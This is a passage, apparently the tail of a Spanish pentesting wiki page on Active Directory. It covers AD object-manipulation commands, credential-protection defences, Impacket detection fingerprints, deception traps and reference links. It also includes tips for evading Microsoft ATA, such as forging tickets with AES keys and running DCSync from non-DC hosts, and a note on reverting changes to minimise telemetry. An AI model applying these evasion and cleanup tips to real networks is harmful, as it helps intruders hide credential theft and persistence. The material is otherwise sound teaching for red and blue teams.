- `move-object` cambia el DN/OU de equipos o usuarios, lo que permite al atacante poner los activos bajo permisos delegados antes de usar `set-password`, `add-groupmember` o `add-spn`. Consulta [Reubicación de OU y permisos heredados](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) para ver los permisos de movimiento y las comprobaciones de herencia.
- Los comandos de eliminación con un alcance preciso (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permiten revertir rápidamente los cambios después de que el operador recopile credenciales o establezca persistencia, minimizando la telemetría.

## AD -> Azure y Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algunas defensas generales

[**Más información sobre cómo proteger las credenciales aquí.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para la protección de credenciales**

- **Restricciones para Domain Admins**: Se recomienda que los Domain Admins solo puedan iniciar sesión en los Domain Controllers, evitando su uso en otros hosts.
- **Privilegios de cuentas de servicio**: Los servicios no deben ejecutarse con privilegios de Domain Admin (DA) para mantener la seguridad.
- **Limitación temporal de privilegios**: Se debe limitar la duración de las tareas que requieren privilegios de DA. Esto se puede lograr con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigación de relay LDAP**: Audita los Event IDs 2889/3074/3075 y luego aplica LDAP signing y el channel binding de LDAPS en DCs/clientes para bloquear intentos de MITM/relay LDAP.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Huella digital a nivel de protocolo de la actividad de Impacket

Si quieres detectar técnicas habituales de AD, **no te bases únicamente en artefactos controlados por el operador**, como binarios renombrados, nombres de servicios, archivos batch temporales o rutas de salida. Establece una referencia de cómo los clientes legítimos de Windows generan tráfico [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC y WMI; luego busca **particularidades de implementación** que persistan incluso después de que el operador modifique `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` o `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Posibles indicadores independientes de alta confianza** (tras validarlos con tu propia referencia):
  - DCE/RPC autenticado con `auth_context_id = 79231 + ctx_id`
  - Relleno de autenticación DCE/RPC compuesto por `0xff`
  - Enlaces Kerberos LDAP que colocan un `AP-REQ` Kerberos sin procesar directamente en `mechToken` de SPNEGO
  - Solicitudes de negociación SMB2/3 con valores de `ClientGuid` que parecen ASCII
  - `IWbemLevel1Login::NTLMLogin` de WMI que usa el espacio de nombres no estándar `//./root/cimv2`
  - Valores de nonce Kerberos codificados de forma fija
- **Mejor como señales de correlación/puntuación**:
  - Listas de etype Kerberos escasas o duplicadas, `PA-DATA` inusual/ausente u orden de etype en TGS-REQ distinto del nativo de Windows
  - Mensajes NTLM Type 1 sin información de versión o mensajes Type 3 con nombres de host nulos
  - NTLMSSP sin procesar transportado en DCE/RPC en lugar de SPNEGO, ausencia de trailers de verificación DCE/RPC o discordancias entre los OID de SPNEGO/Kerberos
  - Varias de estas características del mismo host/usuario/sesión/intervalo temporal son mucho más significativas que cualquier campo débil por sí solo
- **Úsalas como datos complementarios, no como alertas independientes**:
  - Nombres de archivo predeterminados, rutas de salida, nombres de servicios aleatorios, nombres de archivos batch temporales, nombres de cuentas de equipo predeterminados y cadenas HTTP/WebDAV/RDP/MSSQL específicas de las herramientas
  - Los operadores pueden cambiar estos valores fácilmente; es mejor usarlos para explicar por qué un conjunto de señales de varios protocolos resulta sospechoso
- **Notas operativas**:
  - Algunas de estas señales requieren tráfico descifrado, análisis de [PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW o visibilidad del lado del servicio
  - Valida las señales con clientes Samba/Linux, dispositivos y software heredado antes de convertirlas en alertas
  - A medida que ganes confianza en la referencia, promueve las detecciones de datos complementarios -> búsqueda de amenazas -> alertas

### **Implementación de técnicas de deception**

- Implementar deception implica preparar trampas, como usuarios o equipos señuelo, con características como contraseñas que no caducan o la marca Trusted for Delegation. Un enfoque detallado incluye crear usuarios con derechos específicos o añadirlos a grupos con privilegios elevados.<sup>[[2]](#references)</sup>
- Un ejemplo práctico consiste en usar herramientas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Encontrarás más información sobre cómo implementar técnicas de deception en [Deploy-Deception en GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificación de deception**

- **En objetos de usuario**: Los indicadores sospechosos incluyen valores atípicos de ObjectSID, inicios de sesión poco frecuentes, fechas de creación y pocos intentos fallidos de contraseña.
- **Indicadores generales**: Comparar los atributos de posibles objetos señuelo con los de objetos reales puede revelar inconsistencias. Herramientas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pueden ayudar a identificar este tipo de deception.

### **Cómo evadir los sistemas de detección**

- **Evasión de la detección de Microsoft ATA**:
  - **Enumeración de usuarios**: Evita enumerar sesiones en los Domain Controllers para prevenir la detección por parte de ATA.
  - **Suplantación de tickets**: Usar claves **aes** para crear tickets ayuda a evadir la detección al evitar la degradación a NTLM.
  - **Ataques DCSync**: Se recomienda ejecutarlos desde un equipo que no sea Domain Controller para evitar la detección por parte de ATA, ya que ejecutarlos directamente desde un Domain Controller activará alertas.

## References

- [1] [Guía para atacar las relaciones de confianza entre dominios](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forjar relaciones de confianza para deception en Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [De Domain Admin a Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Colección LDAP BOF: toolkit LDAP en memoria para la explotación de Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – ¡Holy Shuck! Armar hashes NTLM como wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [CTF Barbhack 2025 (laboratorio AD de NetExec) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Análisis de Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: toma de control de cuentas de Active Directory mediante Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Cómo administrar los cambios en las conexiones del canal seguro de Netlogon asociados con CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Un recorrido por las interfaces Null Session y MS-RPC olvidadas](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [¿Es el filtrado de SID una frontera de seguridad entre dominios? (Parte 4): investigación sobre cómo evadir el filtrado de SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [¿Es el filtrado de SID una frontera de seguridad entre dominios? (Parte 5): ataque Golden GMSA trust, del dominio hijo al principal](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [¿Es el filtrado de SID una frontera de seguridad entre dominios? (Parte 6): ataque de confianza mediante cambios de esquema, del dominio hijo al principal](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [De DA a EA con ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Cómo escalar de los administradores de un dominio hijo a Enterprise Admins en 5 minutos mediante el abuso de AD CS: seguimiento](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Un as bajo la manga: diseño de puertas traseras DACL de Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Código fuente del módulo pre2k de NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - atributo msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
